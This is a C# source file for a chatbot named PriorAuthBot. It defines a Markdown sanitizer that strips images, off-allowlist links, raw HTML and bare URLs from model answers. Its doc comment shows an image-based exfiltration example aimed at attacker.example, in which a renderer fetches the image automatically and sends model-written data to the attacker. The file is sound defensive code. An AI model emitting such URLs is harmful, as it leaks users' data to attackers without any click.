using System.Text.RegularExpressions;

namespace PriorAuthBot.Core.Security;

/// <summary>What the sanitizer removed from one answer, for logs and the red-team report.</summary>
public sealed record SanitizeResult(string Text, int ImagesRemoved, int LinksRemoved, int HtmlRemoved)
{
    public int Total => ImagesRemoved + LinksRemoved + HtmlRemoved;
}

/// <summary>
/// Makes a model's answer safe to render as Markdown (chapter 12, OWASP LLM05). The danger is not
/// what the text says but what a renderer does with it: an image is fetched the moment it is shown,
/// so <c>![](https://attacker.example/p.png?d=...)</c> sends whatever the model put after <c>d=</c>
/// to the attacker with no click at all. The rules:
/// <list type="bullet">
/// <item>Images are removed, every one. PriorAuthBot's answers are text; an image in one was put
/// there by someone other than us. Only the alt text is kept.</item>
/// <item>Links stay only when they point at PriorAuthBot itself (a relative path such as
/// <c>/documents/pto-policy#carryover</c>) or at a host on <see cref="SecurityOptions.AllowedLinkHosts"/>
/// over HTTPS. Anything else keeps its text and loses its URL.</item>
/// <item>Bare URLs and autolinks to other hosts are removed, because most renderers turn them into links.</item>
/// <item>Raw HTML tags are removed; a Markdown renderer passes many of them through.</item>
/// </list>
/// The client should still render with HTML disabled and links opened safely. This is the server's
/// half, which protects every client, including ones that do neither.
/// </summary>
public static partial class MarkdownSanitizer
{
    public const string LinkRemoved = "[link removed]";

    public static SanitizeResult Sanitize(string text, IEnumerable<string>? allowedHosts = null)
    {
        ArgumentNullException.ThrowIfNull(text);
        var hosts = new HashSet<string>(allowedHosts ?? [], StringComparer.OrdinalIgnoreCase);
        int images = 0, links = 0, html = 0;

        // Images first, including reference-style images: ![alt][ref].
        text = Image().Replace(text, m =>
        {
            images++;
            return m.Groups["alt"].Value.Trim();
        });

        // Reference definitions ("[1]: https://...") turn [text][1] into a link anywhere in the answer.
        text = ReferenceDefinition().Replace(text, m =>
        {
            if (IsAllowed(m.Groups["url"].Value, hosts))
            {
                return m.Value;
            }

            links++;
            return string.Empty;
        });

        text = InlineLink().Replace(text, m =>
        {
            if (IsAllowed(m.Groups["url"].Value, hosts))
            {
                return m.Value;
            }

            links++;
            return m.Groups["text"].Value;
        });

        text = HtmlTag().Replace(text, _ =>
        {
            html++;
            return string.Empty;
        });

        text = BareUrl().Replace(text, m =>
        {
            if (IsAllowed(m.Value, hosts))
            {
                return m.Value;
            }

            links++;
            return LinkRemoved;
        });

        return new SanitizeResult(text, images, links, html);
    }

    /// <summary>A relative link into PriorAuthBot, a fragment, or HTTPS to an allowed host. Never javascript:, data:, or a protocol-relative //host.</summary>
    public static bool IsAllowed(string url, IReadOnlySet<string> allowedHosts)
    {
        ArgumentNullException.ThrowIfNull(url);
        ArgumentNullException.ThrowIfNull(allowedHosts);
        url = url.Trim().Trim('<', '>');
        if (url.StartsWith('#') || (url.StartsWith('/') && !url.StartsWith("//", StringComparison.Ordinal) && !url.Contains('\\', StringComparison.Ordinal)))
        {
            return true;
        }

        return Uri.TryCreate(url, UriKind.Absolute, out var uri)
            && uri.Scheme == Uri.UriSchemeHttps
            && allowedHosts.Contains(uri.Host);
    }

    [GeneratedRegex(@"!\[(?<alt>[^\]]*)\]\s*(\((?:[^()]|\([^()]*\))*\)|\[[^\]]*\])", RegexOptions.CultureInvariant)]
    private static partial Regex Image();

    [GeneratedRegex(@"^[ \t]{0,3}\[[^\]]+\]:[ \t]*(?<url>\S+).*$", RegexOptions.Multiline | RegexOptions.CultureInvariant)]
    private static partial Regex ReferenceDefinition();

    [GeneratedRegex(@"\[(?<text>[^\]]*)\]\(\s*(?<url><[^>]*>|(?:[^()\s]|\([^()\s]*\))*)(\s+(""[^""]*""|'[^']*'))?\s*\)", RegexOptions.CultureInvariant)]
    private static partial Regex InlineLink();

    [GeneratedRegex(@"</?[a-zA-Z][a-zA-Z0-9-]*(\s[^<>]*)?/?>", RegexOptions.CultureInvariant)]
    private static partial Regex HtmlTag();

    [GeneratedRegex(@"<?\b(https?|ftp|javascript|data|file):[^\s<>()\[\]""']+>?", RegexOptions.IgnoreCase | RegexOptions.CultureInvariant)]
    private static partial Regex BareUrl();
}
